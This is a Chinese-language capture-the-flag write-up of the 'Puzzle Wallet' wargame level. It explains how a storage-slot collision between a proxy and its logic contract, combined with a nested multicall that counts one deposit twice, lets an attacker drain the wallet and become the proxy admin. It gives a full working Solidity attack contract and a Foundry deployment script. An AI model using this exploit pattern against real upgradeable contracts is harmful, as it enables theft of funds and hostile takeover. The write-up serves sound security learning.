# Puzzle Wallet 代理合约

<font style="color:rgb(34, 34, 34);">邪恶钱包我讨厌你。。。</font>

# 源码

目标:把钱拿走,<font style="color:rgb(34, 34, 34);">成为代理的管理员</font>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin; //0
    address public admin; //1

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin; //添加新的管理员
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
        //合约升级
    }
}

contract PuzzleWallet {
    address public owner; //0
    uint256 public maxBalance; //1
    mapping(address => bool) public whitelisted; //2
    mapping(address => uint256) public balances; //3

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

```

# 思路

这是一个有关代理的题,那就能想到stroage都存储在代理合约里,找找看有没有delegatecall存储槽错位的,嘿嘿,还真有

```solidity
    address public pendingAdmin; //0
    address public admin; //1
```

```solidity
    address public owner; //0
    uint256 public maxBalance; //1
```

delegatecall时他俩读一套storage,顺着代理合约1槽admin看逻辑合约1槽maxBalance,找到了`setMaxBalance()`函数,只要满足`address(this).balance == 0`条件就能把我们设为maxBalance---即admin

逻辑合约都是仅限白名单调用函数,那就得成为白名单呗,`addToWhitelist()`函数,要求`msg.sender == owner`,那我们就得先成为owner,顺着逻辑合约0槽的owner看代理合约0槽的pendingAdmin,可以在代理合约找到这样一个函数`proposeNewAdmin()`能够设置pendingAdmin.

这就是我们攻击合约第一步--调用代理合约`proposeNewAdmin()`函数,把pendingAdmin设置为address(this)

注意这步不是delegatecall,就是代理合约自己玩自己的,还没有影响到逻辑合约的0槽owner

到了第二步,调用逻辑合约`addToWhitelist()`设白名单的时候,要判断msg.sender == owner,这一步是delegatecall,所以要读owner就会读到代理合约的同样0槽`pendingAdmin`变量,是address(this),也就是owner=address(this)=msg.sender,好,require过了,address(this)成功设为白名单

接下来是个难点,头一次接触哈

```solidity
bytes[] memory depositdata = new bytes[](1); // 构造 deposit 的 calldata
        depositdata[0] = abi.encodeWithSelector(puzzle.deposit.selector); //deposit()
        bytes[] memory data = new bytes[](2); // 构造外层 multicall 的 calldata
        data[0] = depositdata[0]; // 一次 deposit
        data[1] = abi.encodeWithSelector(
            puzzle.multicall.selector,
            depositdata
        ); //第二次 deposit 被嵌套
        puzzle.multicall{value: 0.001 ether}(data); 
```

```solidity
→ multicall(data) // data 是长度为 2 的 bytes[]，包含两次调用
   ├─ data[0] = deposit()                 ← 直接调用 deposit()
   └─ data[1] = multicall([deposit()])    ← 再次调用 multicall 包裹 deposit()
        └─ deposit()                      ← 第二次 deposit()
```

这样就绕过了「只允许调用一次 deposit()」的限制，实际上执行了两次 balances\[msg.sender] += msg.value，达到了“余额翻倍”的攻击目的

如此大费周章的是为了满足取钱函数`execute()`的这个条件`require(balances[msg.sender] >= value`

然后就取钱吧,取完`address(this).balance == 0`,即满足了`setMaxBalance()`的条件,我们就能设置成admin了

最后自毁一下,把钱都拿给eoa

攻击合约记得写一个receive()

# 攻击合约

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {PuzzleWallet, PuzzleProxy} from "./puzzlewallet.sol";

contract Attack {
    PuzzleProxy public proxy;
    PuzzleWallet public puzzle;

    constructor(address proxyaddr) {
        puzzle = PuzzleWallet(payable(proxyaddr));
        proxy = PuzzleProxy(payable(proxyaddr));
    }

    function attack() external payable {
        //require(msg.value == 0.001 ether, "send exactly 0.001 ether");
        proxy.proposeNewAdmin(payable(address(this))); //设为owner
        puzzle.addToWhitelist(address(this)); //设为白名单

        bytes[] memory depositdata = new bytes[](1); // 构造 deposit 的 calldata
        depositdata[0] = abi.encodeWithSelector(puzzle.deposit.selector); //deposit()
        bytes[] memory data = new bytes[](2); // 构造外层 multicall 的 calldata
        data[0] = depositdata[0]; // 一次 deposit
        data[1] = abi.encodeWithSelector(
            puzzle.multicall.selector,
            depositdata
        ); //第二次 deposit 被嵌套
        puzzle.multicall{value: 0.001 ether}(data);
        puzzle.execute(msg.sender, 0.002 ether, "");
        puzzle.setMaxBalance(uint256(uint160(msg.sender)));
        require(proxy.admin() == msg.sender, "no");
        selfdestruct(payable(0x98707a8Cb53bD823f9c5353611018aF38533adE5));
    }

    receive() external payable {}
}

```

# 脚本

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack(
            payable(0x9661cB7FC5c5A0FBaf0De53F07b172Eb50a59688)
        );
        attack.attack{value: 0.002 ether}();
        vm.stopBroadcast();
    }
}

```


> 更新: 2025-07-21 16:29:40  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/go34n3wd4ge8o8fa>